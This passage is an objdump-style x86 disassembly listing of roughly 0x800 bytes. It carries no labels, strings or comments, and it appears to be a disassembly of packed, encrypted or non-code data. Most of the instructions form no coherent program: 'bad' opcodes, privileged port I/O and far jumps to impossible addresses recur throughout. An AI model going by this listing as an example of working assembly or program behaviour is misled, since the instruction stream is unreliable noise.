  40b07d:	jns    0x40b062
  40b07f:	lods   eax,DWORD PTR ds:[esi]
  40b080:	fmul   DWORD PTR [ebx+0x5e91ed26]
  40b086:	mov    ch,0xcd
  40b088:	xlat   BYTE PTR ds:[ebx]
  40b089:	pop    ss
  40b08a:	test   BYTE PTR [ebp+edx*1-0x43034984],cl
  40b091:	dec    ecx
  40b092:	xor    esp,DWORD PTR [esi]
  40b094:	fnstenv [eax+0x71]
  40b097:	fdiv   DWORD PTR [eax+edi*2+0x12]
  40b09b:	sbb    eax,0xcf920852
  40b0a0:	fldcw  WORD PTR ds:0xb75207eb
  40b0a6:	or     ch,dh
  40b0a8:	cs add eax,0x8295dea5
  40b0ae:	xchg   esi,eax
  40b0af:	stc    
  40b0b0:	xlat   BYTE PTR ds:[ebx]
  40b0b1:	or     BYTE PTR [ecx],dl
  40b0b3:	xchg   DWORD PTR [eax-0x730eca3e],edx
  40b0b9:	xchg   ebp,eax
  40b0ba:	inc    esi
  40b0bb:	xchg   ebx,eax
  40b0bc:	in     eax,dx
  40b0bd:	addr16 cmp ebx,ebp
  40b0c0:	cmp    DWORD PTR [eax-0x655eb194],ebp
  40b0c6:	out    dx,eax
  40b0c7:	adc    BYTE PTR [esi+ebx*1-0xb264bc3],al
  40b0ce:	outs   dx,DWORD PTR ds:[esi]
  40b0cf:	pushf  
  40b0d0:	adc    DWORD PTR [edi+0x577f6c20],edi
  40b0d6:	pop    ds
  40b0d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0d8:	mov    al,ds:0x36f74968
  40b0dd:	es cli 
  40b0df:	pop    esp
  40b0e0:	(bad)  
  40b0e1:	cmp    al,0x44
  40b0e3:	mov    cl,0x20
  40b0e5:	jge    0x40b0c7
  40b0e7:	add    DWORD PTR [ebx],0x4e5e43b2
  40b0ed:	mov    al,ds:0xc5f48224
  40b0f2:	out    dx,al
  40b0f3:	inc    ebx
  40b0f4:	mov    al,ds:0x85ef43c8
  40b0f9:	xchg   ecx,eax
  40b0fa:	ins    DWORD PTR es:[edi],dx
  40b0fb:	jp     0x40b0ba
  40b0fd:	ss cmc 
  40b0ff:	mov    ds:0x85e781f7,al
  40b104:	add    esp,DWORD PTR [ecx+0x4c]
  40b107:	sbb    al,0xe3
  40b109:	pop    eax
  40b10a:	adc    bh,ah
  40b10c:	jl     0x40b126
  40b10e:	loope  0x40b0a8
  40b110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b111:	sub    dh,BYTE PTR [eax+0x3d]
  40b114:	or     ecx,esp
  40b116:	dec    esp
  40b117:	test   DWORD PTR [eax-0x57a5dd8f],ebx
  40b11d:	dec    edx
  40b11e:	(bad)  
  40b11f:	jl     0x40b0ad
  40b121:	mov    cl,0x76
  40b123:	push   ebx
  40b124:	inc    edi
  40b125:	rcr    DWORD PTR [eax+esi*4],0x92
  40b129:	pop    ebp
  40b12a:	jbe    0x40b107
  40b12c:	sbb    ah,ch
  40b12e:	popf   
  40b12f:	aad    0xd1
  40b131:	jmp    0x40b155
  40b133:	jge    0x40b0e1
  40b135:	mov    edi,0x2a4789ab
  40b13a:	ret    
  40b13b:	mov    ss,WORD PTR [ebp-0x3]
  40b13e:	adc    edi,esp
  40b140:	cmc    
  40b141:	mov    edi,0xa7f705a5
  40b146:	lods   al,BYTE PTR ds:[esi]
  40b147:	pop    ebp
  40b148:	push   ds
  40b149:	push   ebp
  40b14a:	fst    QWORD PTR [esi+0x68]
  40b14d:	sub    eax,0x17430263
  40b152:	out    dx,al
  40b153:	hlt    
  40b154:	inc    eax
  40b155:	add    al,0x41
  40b157:	stos   BYTE PTR es:[edi],al
  40b158:	es adc eax,0x52961aff
  40b15e:	or     eax,0x90278c6b
  40b163:	xchg   edx,eax
  40b164:	push   es
  40b165:	or     dl,bl
  40b167:	mov    ds:0x651ada19,al
  40b16c:	neg    BYTE PTR [edx-0x79]
  40b16f:	imul   esi,DWORD PTR [ecx],0x8472c482
  40b175:	adc    edx,DWORD PTR [ebp+0x5]
  40b178:	int    0x41
  40b17a:	or     al,0x11
  40b17c:	mov    dh,BYTE PTR [ebp+0x63]
  40b17f:	inc    edx
  40b180:	and    al,0xc5
  40b182:	jle    0x40b149
  40b184:	mov    edi,ecx
  40b186:	inc    esi
  40b187:	sbb    eax,0x9781571e
  40b18c:	cdq    
  40b18d:	xor    DWORD PTR [ebx-0x6d3513e9],0xf1f1b1e8
  40b197:	inc    ecx
  40b198:	xor    bh,BYTE PTR [edx+0x6e]
  40b19b:	es mov ebx,0x65f6e342
  40b1a1:	jle    0x40b1ea
  40b1a3:	jns    0x40b17f
  40b1a5:	popa   
  40b1a6:	mov    bh,0x92
  40b1a8:	mov    ds:0x56c64182,eax
  40b1ad:	cwde   
  40b1ae:	out    0x3c,al
  40b1b0:	loope  0x40b225
  40b1b2:	xor    ebp,ebx
  40b1b4:	sahf   
  40b1b5:	int3   
  40b1b6:	(bad)  
  40b1b7:	ds sbb eax,0x3bf5ec5c
  40b1bd:	push   edx
  40b1be:	sub    DWORD PTR [esp+ecx*2+0x28],ebp
  40b1c2:	add    BYTE PTR [edx],cl
  40b1c4:	dec    ebp
  40b1c5:	or     ch,BYTE PTR [ecx-0x37]
  40b1c8:	retf   0x42ff
  40b1cb:	repz fucomi st,st(7)
  40b1ce:	arpl   WORD PTR [edi+ecx*8],dx
  40b1d1:	das    
  40b1d2:	(bad)  
  40b1d4:	fcmovnu st,st(4)
  40b1d6:	dec    edx
  40b1d7:	and    BYTE PTR [eax],al
  40b1d9:	aam    0x66
  40b1db:	and    BYTE PTR [edx+ecx*8+0x52],bl
  40b1df:	mov    eax,ds:0xa50ac484
  40b1e4:	add    al,0xf2
  40b1e6:	pop    ds
  40b1e7:	sub    DWORD PTR [edx+0x2a870bc4],esi
  40b1ed:	push   0xdee77c7e
  40b1f2:	adc    BYTE PTR [edi+0x194e4684],dh
  40b1f8:	dec    edi
  40b1f9:	push   edx
  40b1fa:	iret   
  40b1fb:	pop    ebp
  40b1fc:	daa    
  40b1fd:	or     al,0x4d
  40b1ff:	cmc    
  40b200:	scas   al,BYTE PTR es:[edi]
  40b201:	aas    
  40b202:	jne    0x40b219
  40b204:	lea    esp,[ebx-0x29]
  40b207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b208:	and    al,0x5a
  40b20a:	ror    DWORD PTR [ebx-0x819422c],0xf8
  40b211:	inc    BYTE PTR [esi+ebp*1]
  40b214:	push   0x15
  40b216:	dec    esp
  40b217:	lods   al,BYTE PTR ds:[esi]
  40b218:	(bad)  
  40b219:	fiadd  DWORD PTR [edi+ebp*8+0x11a82a57]
  40b220:	push   0x3d286ae
  40b225:	and    BYTE PTR [ebp-0x2912aa5a],dl
  40b22b:	je     0x40b26f
  40b22d:	jmp    0xfbef2a31
  40b232:	pop    esp
  40b233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b234:	mov    ds,ebx
  40b236:	mov    ebx,fs
  40b238:	enter  0x9d5e,0xcd
  40b23c:	or     eax,0xc7423981
  40b241:	repnz neg DWORD PTR [ecx+0x1a]
  40b245:	sub    eax,0x2bde6ca1
  40b24a:	jns    0x40b204
  40b24c:	pop    edx
  40b24d:	addr16 (bad) 
  40b24f:	(bad)  
  40b250:	mov    dl,0x4d
  40b252:	xor    BYTE PTR [edx-0x13],bh
  40b255:	or     ch,BYTE PTR [ebx+ebp*1+0x5dd65b29]
  40b25c:	adc    WORD PTR [ecx+eax*8],0xff81
  40b261:	or     ah,BYTE PTR [ebx]
  40b263:	js     0x40b232
  40b265:	sub    al,0x16
  40b267:	ja     0x40b2a5
  40b269:	xchg   esi,eax
  40b26a:	addr16 js 0x40b208
  40b26d:	mov    edi,0x1f63b44f
  40b272:	shr    BYTE PTR [esi+0x46],1
  40b275:	mov    esp,0xd2009a2
  40b27a:	jecxz  0x40b2b2
  40b27c:	outs   dx,DWORD PTR ds:[esi]
  40b27d:	sti    
  40b27e:	or     al,0x27
  40b280:	xor    BYTE PTR [edi+0x2d],al
  40b283:	(bad)  
  40b284:	mov    eax,0x2e87a88d
  40b289:	add    esp,0x9f1c8076
  40b28f:	and    BYTE PTR [esi],0xa
  40b292:	fiadd  WORD PTR [esi+0x1]
  40b295:	inc    ebp
  40b296:	mov    edx,0xb8c951a6
  40b29b:	xor    esi,ecx
  40b29d:	sub    al,0x99
  40b29f:	xor    edi,edi
  40b2a1:	push   ds
  40b2a2:	(bad)
  40b2a5:	xchg   DWORD PTR [edi+0x193cb245],esi
  40b2ab:	arpl   sp,bp
  40b2ad:	sahf   
  40b2ae:	add    esp,DWORD PTR [edx]
  40b2b0:	enter  0xe873,0xb0
  40b2b4:	adc    al,0x48
  40b2b6:	push   ebp
  40b2b7:	or     ebx,DWORD PTR [ebp+0x6c1cd95e]
  40b2bd:	ds adc eax,0xb7b72ce2
  40b2c3:	add    al,0x4e
  40b2c5:	push   DWORD PTR [ecx-0x2b]
  40b2c8:	inc    edi
  40b2c9:	outs   dx,BYTE PTR ds:[esi]
  40b2ca:	add    ebp,DWORD PTR [esi]
  40b2cc:	loop   0x40b2a6
  40b2ce:	fbld   TBYTE PTR [esi]
  40b2d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2d1:	pop    ds
  40b2d2:	dec    edx
  40b2d3:	sar    edi,cl
  40b2d5:	push   ebx
  40b2d6:	gs mov edx,0xc544227a
  40b2dc:	jecxz  0x40b2c5
  40b2de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2df:	(bad)  
  40b2e1:	ja     0x40b355
  40b2e3:	and    eax,0x71ac91f4
  40b2e8:	and    eax,0xd33d0eb
  40b2ed:	cwde   
  40b2ee:	or     ebx,ebp
  40b2f0:	dec    BYTE PTR [edx-0x51]
  40b2f3:	mov    al,ds:0x3b4c9126
  40b2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2f9:	dec    edx
  40b2fa:	mov    ebp,0xf21a5695
  40b2ff:	fcmovbe st,st(0)
  40b301:	(bad)  [ebx]
  40b303:	or     ah,BYTE PTR [eax-0x1b]
  40b306:	(bad)  
  40b307:	dec    eax
  40b308:	adc    al,0xdd
  40b30a:	adc    DWORD PTR [eax],edx
  40b30c:	push   esp
  40b30d:	(bad)
  40b311:	rcl    DWORD PTR [ebp+0xa233eba],0x44
  40b318:	xor    DWORD PTR [edi+edx*2],ecx
  40b31b:	stos   DWORD PTR es:[edi],eax
  40b31c:	in     eax,dx
  40b31d:	sar    edx,cl
  40b31f:	jbe    0x40b315
  40b321:	ja     0x40b38f
  40b323:	push   ss
  40b324:	or     ebx,0x54
  40b327:	aad    0x69
  40b329:	push   ebx
  40b32a:	mov    ebx,DWORD PTR [ecx-0x1d]
  40b32d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b32e:	mov    ds,WORD PTR [ecx-0x177cc9e5]
  40b334:	sahf   
  40b335:	popa   
  40b336:	sbb    esi,DWORD PTR [edi-0x67bfc022]
  40b33c:	mov    al,ds:0x96027097
  40b341:	hlt    
  40b342:	and    BYTE PTR [edi],dh
  40b344:	sub    eax,0x994503e0
  40b349:	xlat   BYTE PTR ds:[ebx]
  40b34a:	jecxz  0x40b398
  40b34c:	xchg   ecx,eax
  40b34d:	pop    esi
  40b34e:	std    
  40b34f:	xchg   edx,eax
  40b350:	and    eax,0x2fe05df8
  40b355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b356:	mov    cl,0xb7
  40b358:	ret    0xfdf8
  40b35b:	inc    eax
  40b35c:	push   ecx
  40b35d:	aas    
  40b35e:	sub    al,0x78
  40b360:	sti    
  40b361:	pusha  
  40b362:	add    BYTE PTR [ebp+0xf],bh
  40b365:	pop    esi
  40b366:	stos   DWORD PTR es:[edi],eax
  40b367:	jg     0x40b3c0
  40b369:	test   BYTE PTR [eax-0x6b],ah
  40b36c:	add    al,0xd6
  40b36e:	sub    eax,0x10e6814f
  40b373:	icebp  
  40b374:	jb     0x40b3a4
  40b376:	xchg   ecx,eax
  40b377:	pop    ebp
  40b378:	jge    0x40b37a
  40b37a:	and    al,0xd8
  40b37c:	stos   BYTE PTR es:[edi],al
  40b37d:	mov    cl,0x78
  40b37f:	push   ss
  40b380:	inc    esp
  40b381:	adc    DWORD PTR [edi-0xe],edi
  40b384:	xor    edi,0xff2d8242
  40b38a:	bound  ebx,QWORD PTR [ebx+0x5e45790]
  40b390:	aam    0x67
  40b392:	adc    cl,BYTE PTR [ebx+0x2ece43a]
  40b398:	mov    bl,0x44
  40b39a:	outs   dx,BYTE PTR ds:[esi]
  40b39b:	inc    ecx
  40b39c:	in     al,dx
  40b39d:	or     ecx,DWORD PTR [edi+0x5c]
  40b3a0:	xchg   edx,eax
  40b3a1:	xchg   esi,eax
  40b3a2:	xor    eax,DWORD PTR [ebx]
  40b3a4:	sbb    eax,DWORD PTR [eax+0x6b5d1846]
  40b3aa:	push   edx
  40b3ab:	mov    ecx,0x740fc758
  40b3b0:	mov    eax,0xcb3e8422
  40b3b5:	sub    BYTE PTR [ebx-0x4c1ee677],0xe3
  40b3bc:	jecxz  0x40b3fc
  40b3be:	cmp    ch,ah
  40b3c0:	icebp  
  40b3c1:	inc    edi
  40b3c2:	fidivr DWORD PTR [ebx+0xaa19b73]
  40b3c8:	sub    esi,DWORD PTR [edi]
  40b3ca:	cmp    eax,0xed9c408f
  40b3cf:	mov    fs,WORD PTR [ecx]
  40b3d1:	into   
  40b3d2:	pop    ebx
  40b3d3:	mov    cl,0x19
  40b3d5:	test   ch,bh
  40b3d7:	push   edx
  40b3d8:	in     al,0xe5
  40b3da:	jecxz  0x40b3ca
  40b3dc:	imul   ecx,DWORD PTR [ebx-0x60],0xa5664881
  40b3e3:	pop    esi
  40b3e4:	int    0x73
  40b3e6:	cwde   
  40b3e7:	jmp    0xa850e99a
  40b3ec:	js     0x40b43d
  40b3ee:	sbb    al,0xba
  40b3f0:	cmp    BYTE PTR [edx],0xda
  40b3f3:	add    eax,0xe5c4a4f3
  40b3f8:	mov    WORD PTR [ebp-0x11],ds
  40b3fb:	sub    al,0x28
  40b3fd:	xchg   esp,eax
  40b3fe:	rol    BYTE PTR [edx],cl
  40b400:	sbb    eax,0xaf093db
  40b405:	cwde   
  40b406:	(bad)  
  40b408:	mov    cs,WORD PTR ds:[edx+0x1650bd2f]
  40b40f:	or     edx,edi
  40b411:	add    DWORD PTR [esi],0x31b4c3da
  40b417:	or     dh,bl
  40b419:	int    0x58
  40b41b:	pop    esp
  40b41c:	xor    DWORD PTR ds:0xfce360f1,esp
  40b422:	stos   DWORD PTR es:[edi],eax
  40b423:	enter  0x5f75,0xb6
  40b427:	adc    eax,0x664adf66
  40b42c:	jmp    0x465a:0x5b740df3
  40b433:	shld   DWORD PTR [ebx+0x468f6109],ebp,cl
  40b43a:	aam    0x16
  40b43c:	push   esp
  40b43d:	xchg   edi,eax
  40b43e:	test   al,0x88
  40b440:	int    0xfe
  40b442:	cmp    edi,esi
  40b444:	mov    ch,0x7f
  40b446:	push   ecx
  40b447:	push   esi
  40b448:	push   es
  40b449:	push   esp
  40b44a:	adc    ah,al
  40b44c:	inc    esi
  40b44d:	jecxz  0x40b3f0
  40b44f:	pop    esp
  40b450:	mov    al,0xe6
  40b452:	sar    ecx,0xdc
  40b455:	or     ecx,DWORD PTR [eax]
  40b457:	mov    dl,0x61
  40b459:	fsub   DWORD PTR [edx]
  40b45b:	xor    al,0x89
  40b45d:	or     DWORD PTR [ecx+0x7a59894f],ecx
  40b463:	sub    DWORD PTR [edi-0x63],0xffffffaf
  40b467:	fst    QWORD PTR ds:0x34dd640f
  40b46d:	and    al,0x2f
  40b46f:	mov    eax,edx
  40b471:	out    0x42,eax
  40b473:	mov    ds:0x871f5245,al
  40b478:	jbe    0x40b44c
  40b47a:	inc    eax
  40b47b:	cmp    cl,BYTE PTR [ebp-0x70]
  40b47e:	fs mov ah,0x30
  40b481:	(bad)  
  40b482:	lea    ebp,[ecx+0x49]
  40b485:	push   0x7087848
  40b48a:	dec    ecx
  40b48b:	xchg   ecx,eax
  40b48c:	je     0x40b4f8
  40b48e:	push   esp
  40b48f:	pop    esi
  40b490:	(bad)  [edx+0x1b27c544]
  40b496:	cwde   
  40b497:	inc    esi
  40b498:	sti    
  40b499:	push   ss
  40b49a:	adc    ch,ch
  40b49c:	nop
  40b49d:	mov    esi,0xc221a935
  40b4a2:	mov    ebp,0x573f46f7
  40b4a7:	sbb    BYTE PTR [edx],dl
  40b4a9:	in     eax,dx
  40b4aa:	pop    ebx
  40b4ab:	mov    ebx,0x8669d076
  40b4b0:	xor    DWORD PTR es:[ecx-0x2d533042],esp
  40b4b7:	sbb    dl,ch
  40b4b9:	mov    edi,0xa448f268
  40b4be:	call   0xea3:0x84bae609
  40b4c5:	and    eax,0x3865d81
  40b4ca:	sub    ebp,edx
  40b4cc:	es mov dl,0x8d
  40b4cf:	call   0xf61b:0xc1e7ca8b
  40b4d6:	dec    ebp
  40b4d7:	mov    al,0x21
  40b4d9:	gs mov ecx,0x2236986
  40b4df:	dec    esp
  40b4e0:	outs   dx,BYTE PTR ds:[esi]
  40b4e1:	adc    al,0x1b
  40b4e3:	adc    cl,BYTE PTR [edx+0x4648023b]
  40b4e9:	inc    edi
  40b4ea:	fsubr  DWORD PTR [esi-0x78ca28da]
  40b4f0:	sbb    eax,0x4f6350a0
  40b4f5:	aam    0x8d
  40b4f7:	mov    bl,0xd7
  40b4f9:	lahf   
  40b4fa:	mov    ecx,ebp
  40b4fc:	adc    bh,BYTE PTR [esi+0x5c]
  40b4ff:	leave  
  40b500:	push   edi
  40b501:	loopne 0x40b50b
  40b503:	sbb    edx,DWORD PTR [eax]
  40b505:	sbb    eax,0xd87ff6ef
  40b50a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b50c:	pop    ebx
  40b50d:	ret    0x2d3e
  40b510:	add    bh,BYTE PTR [edx-0x51]
  40b513:	mov    al,0xd0
  40b515:	jb     0x40b55f
  40b517:	mov    al,dl
  40b519:	mov    esp,0x748b2ec1
  40b51e:	push   0xc7cb47fd
  40b523:	sbb    cl,BYTE PTR [edx*4-0x586fa67f]
  40b52a:	sbb    DWORD PTR [ebx-0xdb07071],ebp
  40b530:	out    0x96,al
  40b532:	mov    ecx,0x197dab90
  40b537:	mov    esp,DWORD PTR [edx+0xe]
  40b53a:	sub    DWORD PTR [ecx+0x27],0x94f416c3
  40b541:	sbb    DWORD PTR [ecx+0x21ecdce9],0x4948830e
  40b54b:	sahf   
  40b54c:	adc    al,0xd9
  40b54e:	xchg   edi,eax
  40b54f:	xchg   esi,eax
  40b550:	aad    0x51
  40b552:	push   edx
  40b553:	les    ebp,FWORD PTR [ecx+ecx*4]
  40b556:	enter  0x7b44,0x9c
  40b55a:	aad    0x55
  40b55c:	push   ds
  40b55d:	xor    BYTE PTR [esi-0x7c1842eb],ah
  40b563:	mov    bl,0x1b
  40b565:	add    ch,BYTE PTR [ecx+0x79a3d6d]
  40b56b:	mov    DWORD PTR [ebp+0x140d3ca1],0xd826d944
  40b575:	xor    BYTE PTR [edx-0x6e],bh
  40b578:	pop    esp
  40b579:	cmp    esi,esi
  40b57b:	enter  0xa48a,0x6b
  40b57f:	inc    ecx
  40b580:	mov    ebp,0x16c17e33
  40b585:	adc    ah,BYTE PTR [ebp+0x445ee416]
  40b58b:	xchg   BYTE PTR [ebx+0x733f987b],bl
  40b591:	outs   dx,BYTE PTR ds:[esi]
  40b592:	adc    BYTE PTR [ecx],al
  40b594:	iret   
  40b595:	lds    edx,FWORD PTR [eax+0x51]
  40b598:	dec    esp
  40b599:	cli    
  40b59a:	stos   BYTE PTR es:[edi],al
  40b59b:	jno    0x40b5f0
  40b59d:	sbb    bl,dh
  40b59f:	xor    bl,BYTE PTR [ecx-0x60]
  40b5a2:	sub    al,0xe9
  40b5a4:	fnsave [edi]
  40b5a6:	xchg   ebx,eax
  40b5a7:	cmp    ebp,DWORD PTR [esp+ecx*1]
  40b5aa:	push   ss
  40b5ab:	fdiv   QWORD PTR [edx]
  40b5ad:	and    eax,0x61818e66
  40b5b2:	bound  ebx,QWORD PTR [edi]
  40b5b4:	dec    ebp
  40b5b5:	fldcw  WORD PTR [esi]
  40b5b7:	inc    edx
  40b5b8:	test   eax,0x129c858f
  40b5bd:	leave  
  40b5be:	mov    DWORD PTR [esi+ecx*8+0x63],ecx
  40b5c2:	xchg   ebx,eax
  40b5c3:	fwait
  40b5c4:	aad    0x70
  40b5c6:	je     0x40b5d9
  40b5c8:	adc    bh,dl
  40b5ca:	xor    esp,DWORD PTR [ebx]
  40b5cc:	sbb    BYTE PTR [edi-0x4e82814f],0x10
  40b5d3:	mov    edi,0xb4443374
  40b5d8:	je     0x40b602
  40b5da:	mov    WORD PTR [edx],ss
  40b5dc:	pusha  
  40b5dd:	stc    
  40b5de:	jno    0x40b5a4
  40b5e0:	test   al,0xf9
  40b5e2:	mov    BYTE PTR [edi],al
  40b5e4:	xchg   edi,eax
  40b5e5:	in     eax,0x4a
  40b5e7:	or     BYTE PTR [edi-0x613a71d4],dl
  40b5ed:	xchg   DWORD PTR [ecx-0x5456314a],ebp
  40b5f3:	scas   eax,DWORD PTR es:[edi]
  40b5f4:	push   0x64
  40b5f6:	fwait
  40b5f7:	xchg   DWORD PTR [ebp-0xc],edi
  40b5fa:	jp     0x40b614
  40b5fc:	pushf  
  40b5fd:	ffree  st(3)
  40b5ff:	adc    al,0x32
  40b601:	jmp    0x40b682
  40b603:	(bad)  
  40b604:	jmp    0x40b653
  40b606:	test   edi,ecx
  40b608:	imul   esp,DWORD PTR [edi],0x45
  40b60b:	mov    eax,ds:0x77ac14c6
  40b610:	mov    ebp,0xe3e1e131
  40b615:	arpl   dx,bp
  40b617:	or     BYTE PTR [ebx+0x113fbaca],cl
  40b61d:	cmp    BYTE PTR [ebx-0x35],ah
  40b620:	xchg   ebx,eax
  40b621:	push   es
  40b622:	outs   dx,DWORD PTR ds:[esi]
  40b623:	mov    dh,0x68
  40b625:	(bad)  
  40b626:	xchg   edx,eax
  40b627:	jo     0x40b5b5
  40b629:	add    al,0x4e
  40b62b:	ds in  al,0x14
  40b62e:	ret    
  40b62f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b630:	test   BYTE PTR [esi],bl
  40b632:	jmp    0xf671:0x9885a58
  40b639:	mov    bl,0x91
  40b63b:	les    esi,FWORD PTR [ecx]
  40b63d:	mov    ch,0xfc
  40b63f:	push   ecx
  40b640:	mov    ecx,0xe8672f91
  40b645:	(bad)  
  40b646:	std    
  40b647:	popa   
  40b648:	adc    DWORD PTR [edx+0x4e],edi
  40b64b:	jmp    0x40b62d
  40b64d:	dec    ebp
  40b64e:	dec    eax
  40b64f:	xchg   esi,eax
  40b650:	dec    edx
  40b651:	(bad)  
  40b652:	mov    edx,0x5b9fee4d
  40b657:	or     eax,0xdaf7e4ac
  40b65c:	inc    ebx
  40b65d:	pop    edi
  40b65e:	arpl   WORD PTR [ecx+0x7bd88fd2],si
  40b664:	in     al,dx
  40b665:	cmp    eax,0x825ba79a
  40b66a:	jb     0x40b6e9
  40b66c:	cmp    bl,cl
  40b66e:	ins    BYTE PTR es:[edi],dx
  40b66f:	add    al,0xe1
  40b671:	stos   BYTE PTR es:[edi],al
  40b672:	sub    BYTE PTR [edi-0x6c8bd596],0xe5
  40b679:	adc    esp,DWORD PTR [esi]
  40b67b:	sub    eax,0x37b083fd
  40b680:	je     0x40b655
  40b682:	cs pop eax
  40b684:	dec    ebp
  40b685:	shl    BYTE PTR [ebx-0x49],1
  40b688:	(bad)  
  40b689:	mov    cs,WORD PTR [ebx+0x2447af41]
  40b68f:	dec    esp
  40b690:	imul   ecx,edi,0x2
  40b693:	rol    DWORD PTR [ebx+eax*2+0x5a991762],1
  40b69a:	dec    ebx
  40b69b:	sub    bh,BYTE PTR [ebx-0x78acd10f]
  40b6a1:	outs   dx,BYTE PTR ds:[esi]
  40b6a2:	test   DWORD PTR [ecx],0xb8217416
  40b6a8:	sar    DWORD PTR [esp+ecx*2],1
  40b6ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6ac:	ret    
  40b6ad:	cli    
  40b6ae:	mov    DWORD PTR [edi],esi
  40b6b0:	jns    0x40b6f1
  40b6b2:	dec    edx
  40b6b3:	(bad)  
  40b6b5:	fcmovb st,st(0)
  40b6b7:	jns    0x40b6d5
  40b6b9:	mov    dl,0x1f
  40b6bb:	lahf   
  40b6bc:	das    
  40b6bd:	hlt    
  40b6be:	xchg   ebx,eax
  40b6bf:	clc    
  40b6c0:	jae    0x40b693
  40b6c2:	adc    ebp,DWORD PTR [eax-0x28]
  40b6c5:	sbb    al,0xd
  40b6c7:	sub    eax,0x7aba6efb
  40b6cc:	mov    eax,ds:0x4ef77007
  40b6d1:	out    0xf3,eax
  40b6d3:	mov    al,ds:0x404f962d
  40b6d8:	mov    WORD PTR [eax],es
  40b6da:	mov    al,bl
  40b6dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6dd:	jp     0x40b6df
  40b6df:	(bad)  
  40b6e0:	and    eax,0x929f4abb
  40b6e5:	jne    0x40b6df
  40b6e7:	in     eax,0x18
  40b6e9:	push   esi
  40b6ea:	mov    esi,0x7ffc4962
  40b6ef:	(bad)  
  40b6f0:	and    al,0xa3
  40b6f2:	lds    ecx,FWORD PTR [ebx+0x7c]
  40b6f5:	sub    eax,0xeafdac22
  40b6fa:	push   edx
  40b6fb:	mov    esp,0xaf7c84f2
  40b700:	jne    0x40b6c1
  40b702:	cmp    dh,BYTE PTR [ebx]
  40b704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b705:	push   ebp
  40b706:	in     eax,0x64
  40b708:	js     0x40b713
  40b70a:	or     bl,BYTE PTR [esi-0x29]
  40b70d:	and    DWORD PTR [ebx-0x37],eax
  40b710:	retf   0x310
  40b713:	xchg   ebp,eax
  40b714:	inc    edi
  40b715:	adc    DWORD PTR [edx-0x3af10a74],esp
  40b71b:	mov    ch,0xea
  40b71d:	xor    edx,DWORD PTR [esi]
  40b71f:	imul   edi,DWORD PTR [ecx-0x77],0xdaf2d834
  40b726:	es pop es
  40b728:	and    DWORD PTR [edx-0x30d56a45],ebx
  40b72e:	dec    edi
  40b72f:	mov    esi,0x73b97dd5
  40b734:	(bad)  
  40b735:	mov    bh,0x8
  40b737:	test   al,0xf7
  40b739:	cld    
  40b73a:	inc    ebx
  40b73b:	sub    DWORD PTR [edi],esi
  40b73d:	mov    cl,0x6b
  40b73f:	xchg   edi,eax
  40b740:	fstp   QWORD PTR [ebx-0x65]
  40b743:	xor    BYTE PTR [ecx+ebx*1+0x2a377042],al
  40b74a:	sbb    esp,DWORD PTR [eax-0x6b]
  40b74d:	mov    eax,0x301d3a43
  40b752:	adc    cl,BYTE PTR [eax]
  40b754:	mov    edi,0x6a30d15c
  40b759:	cmp    eax,DWORD PTR [esi+0x7da73455]
  40b75f:	sti    
  40b760:	rep stos BYTE PTR es:[edi],al
  40b762:	mov    bh,0x29
  40b764:	ficom  WORD PTR [ebx-0x2d]
  40b767:	mov    dh,0x81
  40b769:	std    
  40b76a:	mov    cl,0xcc
  40b76c:	adc    ch,BYTE PTR [edx]
  40b76e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b76f:	cwde   
  40b770:	or     al,bl
  40b772:	jle    0x40b7c6
  40b774:	(bad)  
  40b776:	mov    cl,0x67
  40b778:	pop    edi
  40b779:	cmp    al,BYTE PTR es:[edx-0x6c047551]
  40b780:	xchg   edx,eax
  40b781:	add    al,0xd2
  40b783:	cdq    
  40b784:	adc    edx,DWORD PTR ds:0x7630aae9
  40b78a:	out    0xbe,al
  40b78c:	or     BYTE PTR [ebp-0x3],dh
  40b78f:	pop    es
  40b790:	jnp    0x40b764
  40b792:	jecxz  0x40b7a9
  40b794:	pop    ebx
  40b795:	and    esp,DWORD PTR [ecx]
  40b797:	mov    bh,0x47
  40b799:	and    al,0xad
  40b79b:	clc    
  40b79c:	inc    eax
  40b79d:	add    edx,DWORD PTR [ebx+0x7]
  40b7a0:	fwait
  40b7a1:	cli    
  40b7a2:	jge    0x40b7f0
  40b7a4:	in     al,0xaf
  40b7a6:	int    0x54
  40b7a8:	jge    0x40b784
  40b7aa:	sbb    eax,0x3b2bb37d
  40b7af:	in     al,dx
  40b7b0:	push   edx
  40b7b1:	pop    ds
  40b7b2:	push   cs
  40b7b3:	sbb    dl,BYTE PTR [edi-0x3dfde579]
  40b7b9:	fadd   QWORD PTR [esp+edi*2+0x42]
  40b7bd:	test   al,al
  40b7bf:	inc    esp
  40b7c0:	mov    esi,0x350eb5e9
  40b7c5:	aas    
  40b7c6:	push   es
  40b7c7:	ret    0xe63a
  40b7ca:	push   edi
  40b7cb:	pusha  
  40b7cc:	nop
  40b7cd:	jmp    0xb9ee0226
  40b7d2:	mov    edx,DWORD PTR [eax+0x1a]
  40b7d5:	rcl    DWORD PTR [edi],cl
  40b7d7:	lock mov edx,0x176f195f
  40b7dd:	std    
  40b7de:	loop   0x40b7e6
  40b7e0:	mov    edx,0x8034058c
  40b7e5:	mov    esi,0x1ff3419c
  40b7ea:	enter  0x9363,0xb1
  40b7ee:	add    cl,cl
  40b7f0:	fsubr  DWORD PTR [eax-0x7faacf96]
  40b7f6:	imul   esp,DWORD PTR [esi+0x72],0x97727eba
  40b7fd:	jg     0x40b7d6
  40b7ff:	(bad)  
  40b800:	dec    esp
  40b801:	xor    ah,al
  40b803:	add    eax,0xf084bab7
  40b808:	pop    ss
  40b809:	fdiv   DWORD PTR [ebx-0x51]
